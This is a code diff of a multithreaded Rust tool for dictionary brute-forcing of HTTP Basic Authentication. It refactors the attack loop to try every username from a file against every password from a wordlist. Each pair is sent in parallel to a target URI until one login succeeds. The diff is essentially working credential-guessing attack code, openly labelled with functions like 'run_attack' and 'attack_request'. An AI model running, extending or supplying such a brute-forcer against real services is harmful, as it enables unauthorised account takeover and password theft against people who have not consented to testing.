@@ -24,45 +24,80 @@ pub fn execute_command(parsed_command: HashMap<String, String>) {
             "help" => print_help(),
             command => print_error(format!("Invalid command {}", command)),
         },
-        _ => attack_optimized(parsed_command),
+        _ => run_attack(parsed_command),
     }
 }
 
-fn attack_optimized(parsed_command: HashMap<String, String>) {
+fn run_attack(parsed_command: HashMap<String, String>) {
     let num_threads = load_env_variable_as_usize(MAX_NMUM_THREADS, num_cpus::get(), true);
     let channel_buffer = load_env_variable_as_usize(CHANNEL_BUFFER, CHANNEL_BUFFER_DEF_VALUE, true);
     println!("The channel buffer is {}", channel_buffer);
     let start = Instant::now();
-    let filename = parsed_command.get("dictionary").unwrap();
-    println!("Reading filename {}...", &filename);
-    if let Ok(lines) = read_lines(&filename) {
-        let uri = parsed_command.get("uri").unwrap();
-        let username = parsed_command.get("username").unwrap();
-        rayon::scope(|s| {
-            let (work_queue_sender, work_queue_receiver) =
-                crossbeam_channel::bounded(channel_buffer);
-            println!("I will use [{}] threads", num_threads);
-            for task_counter in 0..num_threads {
-                let work_receiver: Receiver<String> = work_queue_receiver.clone();
-                s.spawn(move |_| {
-                    do_job(
-                        task_counter,
-                        username.as_str(),
-                        uri.as_str(),
-                        &start,
-                        work_receiver,
-                    );
-                });
-            }
-            let mut i = 0;
-            for line in lines {
-                if let Ok(password) = line {
-                    work_queue_sender.send(password).unwrap();
-                    i = (i + 1) % num_threads;
+    let uri = parsed_command.get("uri").unwrap();
+
+    let dictionary_attack = check_username_and_passwords;
+
+    rayon::scope(|s| {
+        let (work_queue_sender, work_queue_receiver) = crossbeam_channel::bounded(channel_buffer);
+        println!("I will use [ {} ] threads", num_threads);
+        for task_counter in 0..num_threads {
+            let work_receiver: Receiver<String> = work_queue_receiver.clone();
+
+            s.spawn(move |_| {
+                do_job(task_counter, uri.as_str(), &start, work_receiver);
+            });
+        }
+
+        let filename_passwords = parsed_command.get("dictionary").unwrap();
+        println!("Reading filename {}...", &filename_passwords);
+
+        match parsed_command.get("usernames") {
+            Some(path) => {
+                if let Ok(usernames) = read_lines(path) {
+                    for line in usernames {
+                        if let Ok(username) = line {
+                            dictionary_attack(
+                                &work_queue_sender,
+                                filename_passwords.as_str(),
+                                &username,
+                                num_threads,
+                            );
+                        }
+                    }
+                    drop(work_queue_sender);
                 }
             }
-            drop(work_queue_sender);
-        });
+            None => {
+                let param_username = parsed_command.get("username").unwrap();
+                dictionary_attack(
+                    &work_queue_sender,
+                    filename_passwords.as_str(),
+                    &param_username,
+                    num_threads,
+                );
+                drop(work_queue_sender);
+                return ();
+            }
+        };
+    });
+}
+
+fn check_username_and_passwords(
+    work_queue_sender: &crossbeam_channel::Sender<String>,
+    filename_passwords: &str,
+    username: &str,
+    num_threads: usize,
+) {
+    let mut i = 0;
+    if let Ok(passwords) = read_lines(filename_passwords) {
+        for line in passwords {
+            if let Ok(password) = line {
+                work_queue_sender
+                    .send(format!("{}|{}", username, password))
+                    .unwrap();
+                i = (i + 1) % num_threads;
+            }
+        }
     }
 }
 
@@ -83,25 +118,25 @@ fn load_env_variable_as_usize(
     }
 }
 
-fn do_job(
-    task_counter: usize,
-    username: &str,
-    uri: &str,
-    start: &Instant,
-    work_receiver: Receiver<String>,
-) {
+fn do_job(task_counter: usize, uri: &str, start: &Instant, work_receiver: Receiver<String>) {
     println!("thread {} initialized", &task_counter);
     loop {
         let tx_res = work_receiver.recv();
+
         match tx_res {
-            Ok(tx) => match attack_request(task_counter, &username, &uri, &tx) {
-                Ok(_) => {
-                    let duration = start.elapsed();
-                    println!("duration: {:?}", duration);
-                    process::exit(0x0100);
+            Ok(tx) => {
+                let separator_pos = tx.chars().position(|c| c == '|').unwrap();
+                let username = &tx[0..separator_pos];
+                let password = &tx[separator_pos + 1..];
+                match attack_request(task_counter, &uri, username, password) {
+                    Ok(_) => {
+                        let duration = start.elapsed();
+                        println!("duration: {:?}", duration);
+                        process::exit(0x0100);
+                    }
+                    Err(_) => (),
                 }
-                _ => (),
-            },
+            }
             Err(err) => {
                 println!("thread {} finished job: {}", &task_counter, err);
                 break;
@@ -112,8 +147,8 @@ fn do_job(
 
 fn attack_request(
     idx: usize,
-    username: &str,
     uri: &str,
+    username: &str,
     password: &str,
 ) -> Result<BruteResponse, String> {
     let auth = base64::encode(format!("{}:{}", &username, &password));
@@ -131,7 +166,7 @@ fn attack_request(
         return Ok(result);
     } else {
         println!(
-            "thread: {}, username: {}, password :{} does not match :(",
+            "[KO] -> thread: [{}], username: [{}], password: [{}]",
             idx + 1,
             &username,
             &password
